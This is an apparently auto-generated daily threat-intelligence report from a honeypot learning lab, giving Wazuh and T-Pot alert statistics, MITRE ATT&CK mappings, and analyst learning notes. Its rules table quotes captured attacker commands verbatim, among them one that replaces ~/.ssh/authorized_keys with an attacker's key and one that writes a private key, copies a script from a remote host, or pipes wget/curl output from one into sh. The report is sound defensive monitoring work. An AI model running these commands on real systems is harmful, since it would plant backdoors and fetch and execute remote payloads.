# LearningLab01 Daily Threat Intelligence Report — 2026-10-16

Generated: 2026-10-16T13:15:05.062Z

Report window: 2026-10-15T13:15:05.035Z through 2026-10-16T13:15:05.035Z

> This report summarizes security telemetry and honeypot activity. An alert indicates that a rule matched observed activity; it does not automatically prove that a system was compromised.

## Executive Summary

| Metric | Count |
|---|---:|
| Wazuh alerts | 218,045 |
| Attack-related alerts | 32,271 |
| Honeypot interactions | 200,000 |
| Authentication failures | 6,951 |
| Authentication successes | 540 |
| Critical alerts | 200 |
| High alerts | 572 |
| T-Pot artifacts observed | 0 |
| Malicious artifact detections | 0 |

### Notable Observations

- 200 critical-severity alerts require priority review.
- 572 high-severity alerts should be reviewed after the critical queue.
- Authentication failures exceeded successful authentications by a ratio of 12.87:1.
- Country attribution currently covers only 0.23% of alerts. Country totals should be treated as partial telemetry.
- The most frequent rule was 110213: T-Pot RDP connection from [IP address] to port 3389. (127,284 alerts).

## Wazuh Security Monitoring

### Alert Severity

| Severity | Alerts | Percentage |
|---|---:|---:|
| Critical | 200 | 0.09% |
| High | 572 | 0.26% |
| Medium | 2,770 | 1.27% |
| Low | 214,503 | 98.38% |
| Informational | 0 | 0.00% |

Severity represents the priority assigned by the Wazuh rule. Critical and high alerts should be investigated first, but repeated lower-severity events can also reveal scanning, credential attacks, or attacker preparation.

### Authentication Activity

- Authentication failures: 6,951
- Authentication successes: 540
- Failure-to-success ratio: 12.87:1

A successful authentication is not considered an attack by itself. Analysts should correlate successful logins with preceding failures, source addresses, usernames, target systems, and expected activity.

### Attack-Type Breakdown

| Category | Alerts | Percentage of attack-related alerts |
|---|---:|---:|
| Network attack | 22,276 | 69.03% |
| Payload delivery | 22,276 | 69.03% |
| Authentication failure | 6,951 | 21.54% |
| Command execution | 2,029 | 6.29% |
| Reconnaissance | 435 | 1.35% |
| Network scan | 296 | 0.92% |
| Malware | 135 | 0.42% |
| Web attack | 93 | 0.29% |
| SMTP attack | 66 | 0.20% |

> Category counts may overlap because one Wazuh alert can belong to multiple rule groups. The attack-related total counts each alert once.

### Country of Origin

Wazuh supplied country information for 508 alerts, representing 0.23% of all alerts.

| Country | Alerts | Percentage of all alerts | Relative volume |
|---|---:|---:|---|
| Unknown | 217,537 | 99.77% | Not geolocated |
| Republic of Moldova | 228 | 0.10% | ████████████████████ |
| Germany | 86 | 0.04% | ████████ |
| United Kingdom | 64 | 0.03% | ██████ |
| Bulgaria | 48 | 0.02% | ████ |
| Romania | 45 | 0.02% | ████ |
| United States | 30 | 0.01% | ███ |
| Canada | 3 | 0.00% | █ |
| Malaysia | 3 | 0.00% | █ |
| Japan | 1 | 0.00% | █ |

> Relative-volume bars compare only countries with known geographic attribution. Unknown alerts are excluded from the bar scale.

> Geolocation is approximate. VPNs, proxies, cloud providers, compromised hosts, carrier networks, and incomplete GeoIP coverage can make the apparent country different from the attacker’s location.

### MITRE ATT&CK Tactics

| Tactic | Alerts |
|---|---:|
| Defense Evasion | 293 |
| Initial Access | 291 |
| Persistence | 291 |
| Privilege Escalation | 291 |
| Credential Access | 97 |
| Lateral Movement | 97 |
| Execution | 22 |
| Impact | 11 |
| Command and Control | 1 |

### MITRE ATT&CK Techniques

| Technique | Alerts |
|---|---:|
| Valid Accounts | 291 |
| Brute Force | 97 |
| Remote Services | 97 |
| Command and Scripting Interpreter | 22 |
| Stored Data Manipulation | 11 |
| Disable or Modify Tools | 2 |
| Ingress Tool Transfer | 1 |

MITRE ATT&CK describes adversary behavior rather than declaring that an attack succeeded. These mappings help analysts connect individual alerts to possible attacker objectives and investigative hypotheses.

### Most Frequent Wazuh Rules

| Rule ID | Highest Level | Alerts | Description | Agents |
|---|---:|---:|---|---|
| 110213 | 4 | 127,284 | T-Pot RDP connection from [IP address] to port 3389. | tpot (127,284) |
| 110204 | 4 | 41,623 | T-Pot Honeytrap connection from [IP address] to port 5901 | tpot (41,623) |
| 110205 | 6 | 22,186 | T-Pot Honeytrap received a payload from [IP address] | tpot (22,186) |
| 110101 | 3 | 7,586 | Cowrie SSH connection from [IP address]. | tpot (7,586) |
| 110102 | 5 | 6,951 | Cowrie failed login from [IP address] using username root. | tpot (6,951) |
| 110207 | 5 | 3,866 | T-Pot SentryPeer SIP activity from [IP address]:10555, method ACK | tpot (3,866) |
| 110201 | 4 | 3,545 | T-Pot Dionaea mssqld connection from [IP address] to port 1433 | tpot (3,545) |
| 110104 | 7 | 1,806 | Cowrie captured a command from [IP address]: g & k \| zpkfq | tpot (1,806) |
| 110219 | 4 | 421 | T-Pot CiscoASA web activity from [IP address]: Request timed out: TimeoutError('The read operation timed out') | tpot (421) |
| 110214 | 9 | 281 | T-Pot RDP honeypot detected a connection burst from [IP address]. | tpot (281) |
| 110216 | 4 | 263 | T-Pot Mailoney received SMTP command from [IP address]: EHLO User  | tpot (263) |
| 110103 | 10 | 249 | Cowrie accepted login from [IP address] using username lghkel	. | tpot (249) |
| 533 | 7 | 241 | Listened ports status (netstat) changed (new port opened or closed). | tpot (241) |
| 110109 | 13 | 200 | Cowrie captured a destructive, persistence, or defense-evasion command from [IP address]: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ | tpot (200) |
| 5501 | 3 | 194 | PAM: Login session opened. | tpot (192), wazuh (2) |
| 5502 | 3 | 173 | PAM: Login session closed. | tpot (171), wazuh (2) |
| 110215 | 4 | 118 | T-Pot MiniPrint event: command_received, action request, Request received | tpot (118) |
| 110105 | 12 | 112 | Cowrie captured a file download from [IP address]. | tpot (112) |
| 110106 | 10 | 97 | Cowrie detected repeated failed logins from [IP address]. | tpot (97) |
| 5715 | 3 | 97 | sshd: authentication success. | tpot (96), wazuh (1) |
| 110223 | 5 | 92 | T-Pot HoneyAML received  request from  to  on port . | tpot (92) |
| 110212 | 10 | 90 | T-Pot Honeytrap detected repeated payload activity from [IP address]. | tpot (90) |
| 203 | 9 | 86 | Agent event queue is full. Events may be lost. | tpot (86) |
| 110217 | 7 | 66 | T-Pot Mailoney captured suspicious SMTP activity from [IP address]: AUTH LOGIN  | tpot (66) |
| 110221 | 7 | 58 | T-Pot CiscoASA detected configuration discovery from [IP address]: "GET /appGet.cgi?hook=get_cfg_clientlist() HTTP/1.1" 404 - | tpot (58) |
| 202 | 7 | 48 | Agent event queue is 90% full. | tpot (48) |
| 205 | 3 | 48 | Agent event queue is back to normal load. | tpot (48) |
| 110209 | 5 | 46 | T-Pot Conpot IEC104 event from [IP address]: NEW_CONNECTION | tpot (46) |
| 2904 | 7 | 44 | Dpkg (Debian Package) half configured. | tpot (44) |
| 510 | 7 | 42 | Host-based anomaly detection event (rootcheck). | wazuh (40), tpot (2) |
| 110220 | 8 | 29 | T-Pot CiscoASA captured a login request from [IP address]: "POST /login.cgi HTTP/1.1" 200 - | tpot (29) |
| 2902 | 7 | 23 | New dpkg (Debian Package) installed. | tpot (23) |
| 110108 | 12 | 22 | Cowrie captured suspicious execution or staging activity from $(src_ip): $(input) | tpot (22) |
| 110211 | 9 | 15 | T-Pot Dionaea detected a connection burst from [IP address]. | tpot (15) |
| 110208 | 7 | 14 | T-Pot SentryPeer detected SIP scanner friendly-scanner from [IP address]:5070 | tpot (14) |
| 592 | 8 | 11 | Log file size reduced. | tpot (11) |
| 19004 | 7 | 3 | SCA summary: CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Score less than 50% (47) | tpot (3) |
| 86003 | 3 | 3 | Docker: Error message | tpot (3) |
| 19010 | 3 | 2 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from failed to passed | tpot (2) |
| 503 | 3 | 2 | Wazuh agent started. | tpot (2) |
| 506 | 3 | 2 | Wazuh agent stopped. | tpot (2) |
| 110107 | 12 | 1 | Cowrie captured a probable payload-retrieval command from [IP address]: uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp \|\| cd /var/tmp \|\| cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.ppk; echo 'StrictHostKeyChecking no; UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -s -F sshcfg -i key.ppk dlr@[IP address]:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh ssh >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://[IP address]/sh \|\| curl -sk https://[IP address]/sh) \| sh -s ssh; fi; rm -rf sshcfg key.ppk out_sh | tpot (1) |
| 110218 | 9 | 1 | T-Pot Mailoney detected repeated SMTP activity from one source. | tpot (1) |
| 110224 | 7 | 1 | T-Pot HoneyAML received an HTTP POST from [IP address] to /api/v1/oauth2-credential/refresh/fake-uuid. | tpot (1) |
| 110226 | 10 | 1 | T-Pot HoneyAML detected repeated web requests from one source. | tpot (1) |
| 19011 | 9 | 1 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure nftables default deny firewall policy.: Status changed from passed to failed | tpot (1) |
| 591 | 3 | 1 | Log file rotated. | tpot (1) |

### New or Previously Unseen Detections

Historical novelty comparison is not enabled in the exporter yet. This section will compare the current report window with the preceding 30-day baseline. Until that comparison is enabled, no rule should be described as new solely because it appears in this report.

### SOC Analyst Learning Notes

1. Begin with critical and high alerts, but validate the underlying event.
2. Determine whether the event represents scanning, attempted access, payload delivery, execution, persistence, or impact.
3. Correlate source IP, username, target, timestamp, and related alerts.
4. Check whether a successful login followed repeated failures.
5. Separate honeypot interaction from activity against production assets.
6. Document evidence supporting both malicious and benign explanations.
7. Escalate based on confirmed risk, affected assets, and confidence—not alert volume alone.

## T-Pot Artifact Intelligence

### Artifact Summary

- Artifacts observed: 0
- Known hashes: 0
- Uploaded or analyzed: 0
- Malicious detections: 0
- Suspicious detections: 0
- Lookup errors: 0

### Artifacts

| SHA-256 | Bytes | Status | Malicious | Suspicious | Undetected | VirusTotal |
|---|---:|---|---:|---:|---:|---|
| No artifacts observed | — | — | — | — | — | — |

## Security Onion Network Monitoring

_Planned integration._

This section will eventually contain Suricata alerts, Zeek observations, network attack types, source-country information, targeted services, new network behaviors, and correlations with Wazuh endpoint alerts.

## Report Limitations

- Alert counts represent rule matches, not necessarily unique attackers.
- Attack-category counts may overlap.
- Honeypot traffic is intentionally exposed and is not equivalent to a compromise of a production system.
- GeoIP attribution is approximate and currently has incomplete coverage.
- VirusTotal results can change as vendors update their detections.

Generated automatically by the LearningLab01 threat-intelligence pipeline.
